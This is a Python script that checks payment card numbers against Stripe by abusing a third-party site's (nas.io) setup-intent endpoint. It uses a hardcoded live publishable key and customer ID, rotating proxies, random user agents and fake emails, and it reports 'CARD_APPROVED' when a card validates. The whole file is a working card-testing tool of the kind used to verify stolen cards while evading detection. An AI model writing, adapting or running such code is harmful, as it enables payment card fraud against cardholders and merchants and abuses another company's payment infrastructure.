import requests
import random
import re
import json
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

fake = Faker()

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

def _run_stripe_auth_nas(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

    u = generate_user_agent()
    email = fake.email()

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': u,
    }

    year_str = str(ano)
    exp_year = year_str[-2:] if len(year_str) >= 2 else year_str.zfill(2)
    exp_month = str(mes).zfill(2)

    stripe_pk = "pk_live_51NqVKuGZrwG9MfzHDmsUzwWfRMllqQIJC5Nsx3XDxJhRFEHeWhS3YWxsH3Tk1nROsBsFco6CpQeSG6Sk8yvJFQmU00VfsC8zfE"

    data_pm = (
        f'billing_details[name]=PythonApi+undefined&'
        f'billing_details[email]={email}&'
        f'billing_details[address][postal_code]=10076&'
        f'billing_details[address][country]=US&'
        f'type=card&'
        f'card[number]={cc}&'
        f'card[cvc]={cvv}&'
        f'card[exp_year]={exp_year}&'
        f'card[exp_month]={exp_month}&'
        f'key={stripe_pk}'
    )

    try:
        # 1. Create Payment Method
        resp_pm = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data_pm, timeout=15)
        if resp_pm.status_code != 200:
            err_data = resp_pm.json()
            err_msg = err_data.get('error', {}).get('message', 'Failed to create payment method')
            return False, err_msg
        
        pm_id = resp_pm.json().get('id')
        if not pm_id:
            return False, "Failed to retrieve payment method ID"

        # 2. Options and Setup Intent creation
        headers_options = {
            'authority': 'main-cdn.nas.io',
            'accept': '*/*',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'origin': 'https://nas.com',
            'referer': 'https://nas.com/',
            'user-agent': u,
        }
        
        try:
            session.options('https://main-cdn.nas.io/api/v1/create-setup-intent-v2/', headers=headers_options, timeout=10)
        except Exception:
            pass

        headers_nas = {
            'authority': 'main-cdn.nas.io',
            'accept': '*/*',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://nas.com',
            'referer': 'https://nas.com/',
            'user-agent': u,
        }

        json_data = {
            'customerId': 'cus_Ua0sculgFyRYCE',
            'paymentProvider': 'stripe-us',
        }

        resp_nas = session.post('https://main-cdn.nas.io/api/v1/create-setup-intent-v2/', headers=headers_nas, json=json_data, timeout=15)
        if resp_nas.status_code != 200:
            return False, f"Nas API setup intent failed: HTTP {resp_nas.status_code}"
        
        nas_data = resp_nas.json()
        si_id = nas_data.get('setupIntent', {}).get('id')
        client_secret = nas_data.get('setupIntent', {}).get('client_secret')
        
        if not si_id or not client_secret:
            return False, "Failed to parse setup intent details from Nas API"

        # 3. Confirm Setup Intent
        data_confirm = (
            f'payment_method={pm_id}&'
            f'expected_payment_method_type=card&'
            f'use_stripe_sdk=true&'
            f'key={stripe_pk}&'
            f'client_attribution_metadata[merchant_integration_source]=l1&'
            f'client_secret={client_secret}'
        )

        resp_confirm = session.post(
            f'https://api.stripe.com/v1/setup_intents/{si_id}/confirm',
            headers=headers,
            data=data_confirm,
            timeout=20
        )
        confirm_data = resp_confirm.json()

        if 'error' in confirm_data:
            err_msg = confirm_data['error'].get('message', 'Setup confirmation failed')
            return False, err_msg

        status = confirm_data.get('status')
        if status in ['succeeded', 'requires_action', 'requires_confirmation']:
            return True, "CARD_APPROVED"
        return False, f"Setup status: {status}"

    except Exception as e:
        return False, f"Stripe Nas check failed: {str(e)}"

async def process_stripe_auth_nas(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_stripe_auth_nas, cc, mes, ano, cvv, proxy_str)
